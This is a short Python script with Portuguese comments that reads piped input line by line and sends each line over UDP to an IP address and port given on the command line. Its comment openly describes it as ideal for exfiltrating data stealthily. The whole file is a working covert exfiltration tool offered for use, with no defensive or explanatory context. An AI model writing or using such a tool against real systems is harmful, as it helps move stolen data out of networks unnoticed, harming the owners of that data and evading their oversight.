import socket
import sys

# Script para ler da entrada padrão (stdin) e enviar cada linha via UDP.
# Ideal para exfiltrar dados de forma furtiva.

if len(sys.argv) != 3:
    print(f"Uso: <comando> | python3 {sys.argv[0]} <IP> <PORTA>")
    sys.exit(1)

HOST = sys.argv[1]
PORT = int(sys.argv[2])

# Cria o socket e itera sobre cada linha recebida via pipe.
try:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        for line in sys.stdin:
            s.sendto(line.encode('utf-8'), (HOST, PORT))
except Exception as e:
    print(f"Erro durante o envio: {e}")